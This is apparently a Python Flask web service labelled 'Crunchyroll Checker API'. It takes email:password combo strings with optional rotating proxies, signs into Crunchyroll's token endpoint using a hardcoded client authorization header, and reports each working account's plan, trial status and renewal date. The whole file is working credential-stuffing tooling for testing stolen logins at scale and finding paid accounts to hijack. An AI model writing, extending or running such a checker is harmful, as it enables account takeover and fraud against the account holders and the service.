from flask import Flask, request, jsonify
import requests
from urllib.parse import quote
from datetime import datetime
import pytz
import json

app = Flask(__name__)

UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/123.0 Safari/537.36"

def format_proxy(proxy_string):
    if not proxy_string:
        return None
    if "@" in proxy_string:
        if not proxy_string.startswith("http"):
            proxy_string = "http://" + proxy_string
        return {"http": proxy_string, "https": proxy_string}
    parts = proxy_string.split(":")
    if len(parts) == 4:
        ip, port, user, pwd = parts
        pstr = f"http://{user}:{pwd}@{ip}:{port}"
        return {"http": pstr, "https": pstr}
    elif len(parts) == 2:
        ip, port = parts
        pstr = f"http://{ip}:{port}"
        return {"http": pstr, "https": pstr}
    return None

def get_access_token(email, password, proxy=None):
    session = requests.Session()
    proxies = format_proxy(proxy) if proxy else None

    headers = {
        "User-Agent": "Crunchyroll/3.78.3 Android/9 okhttp/4.12.0",
        "Authorization": "Basic bWZsbzhqeHF1cTFxeWJwdmY3cXA6VEFlTU9SRDBGRFhpdGMtd0l6TVVfWmJORVRRT2pXWXg=",
        "Content-Type": "application/x-www-form-urlencoded"
    }
    data = f"username={quote(email)}&password={quote(password)}&grant_type=password&scope=offline_access&device_id=14427c33-1893-4bc5-aaf3-dea072be2831&device_type=Chrome%20on%20Android"

    try:
        res = session.post(
            "https://beta-api.crunchyroll.com/auth/v1/token",
            headers=headers, data=data, proxies=proxies, timeout=15
        )
        res_text = res.text
        try:
            json_res = res.json()
        except Exception:
            json_res = None

        if not res.ok or (json_res and json_res.get("error")):
            return None, f"Invalid Credentials or Error: {json_res}", session

        token = json_res.get("access_token") if json_res else None
        if not token:
            return None, "No access token received.", session

        return token, None, session
    except Exception as ex:
        return None, f"Unknown Error: {ex}", session

def fetch_account_details(session, token, proxy=None):
    proxies = format_proxy(proxy) if proxy else None
    headers = {
        "User-Agent": UA,
        "Authorization": f"Bearer {token}",
        "Accept": "application/json, text/plain, */*",
        "Referer": "https://www.crunchyroll.com/account/membership"
    }

    # Fetch account info
    try:
        me_res = session.get("https://www.crunchyroll.com/accounts/v1/me", headers=headers, proxies=proxies, timeout=10)
        try:
            me_json = me_res.json()
        except Exception:
            me_json = None
        if not me_json or "account_id" not in me_json:
            return None, "Failed to get account_id", me_res.text

        account_id = me_json["account_id"]
    except Exception as e:
        return None, f"Exception fetching account info: {e}", None

    # Fetch subscription info
    try:
        subs_res = session.get(f"https://www.crunchyroll.com/subs/v4/accounts/{account_id}/subscriptions", headers=headers, proxies=proxies, timeout=15)
        try:
            subs_json = subs_res.json()
        except Exception:
            subs_json = None
        if not subs_json:
            return None, "Failed to fetch subscriptions", subs_res.text
    except Exception as e:
        return None, f"Exception fetching subscriptions: {e}", None

    # Check if Free account
    if subs_json.get("containerType") == "free":
        return {
            "Account": account_id,
            "Plan": "Free",
            "Status": "free",
            "Trial": False,
            "Renewal": "N/A",
            "Days Left": "N/A"
        }, None, subs_json

    # Premium account parsing
    subs_list = subs_json.get("subscriptions", [])
    if subs_list:
        sub = subs_list[0]
        plan = sub.get("plan", {}).get("tier", {}).get("text") or sub.get("plan", {}).get("name", {}).get("text") or "N/A"
        status = sub.get("status", "N/A")
        trial = sub.get("activeFreeTrial", False)
        next_renewal = sub.get("nextRenewalDate", "N/A")

        # Calculate days left
        days_left = "N/A"
        if next_renewal not in ["N/A", None]:
            try:
                renewal_dt = datetime.strptime(next_renewal, "%Y-%m-%dT%H:%M:%SZ").replace(tzinfo=pytz.UTC)
                ist = pytz.timezone("Asia/Kolkata")
                now = datetime.now(ist)
                days_left = max(0, (renewal_dt.astimezone(ist) - now).days)
            except Exception:
                pass

        return {
            "Account": account_id,
            "Plan": plan,
            "Status": status,
            "Trial": trial,
            "Renewal": next_renewal,
            "Days Left": days_left
        }, None, subs_json

    # Fallback
    return {
        "Account": account_id,
        "Plan": "Unknown",
        "Status": "Unknown",
        "Trial": False,
        "Renewal": "N/A",
        "Days Left": "N/A"
    }, None, subs_json

@app.route("/check", methods=["GET", "POST"])
def check():
    combo = request.values.get("email", "").strip()
    proxy = request.values.get("proxy", "")

    if not combo or ":" not in combo:
        return "❌ Use ?email=email:pass&proxy=proxy", 400

    email, password = combo.split(":", 1)
    token, err, session = get_access_token(email, password, proxy if proxy else None)
    if not token:
        return f"❌ {email}:{password} - {err}", 200

    details, err, raw_json = fetch_account_details(session, token, proxy)
    if not details:
        return f"❌ {email}:{password} - {err}", 200

    resp_str = f"""
✅ Account Info

Account ID: {details['Account']}
Plan: {details['Plan']}
Status: {details['Status']}
Trial: {details['Trial']}
Next Renewal: {details['Renewal']}
Days Left: {details['Days Left']}
"""
    return resp_str, 200, {"Content-Type": "text/plain"}

@app.route("/")
def home():
    return "<h3>Crunchyroll Checker API<br>Use /check?email=email:pass&proxy=proxy (proxy optional)</h3>"

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8000, debug=True)
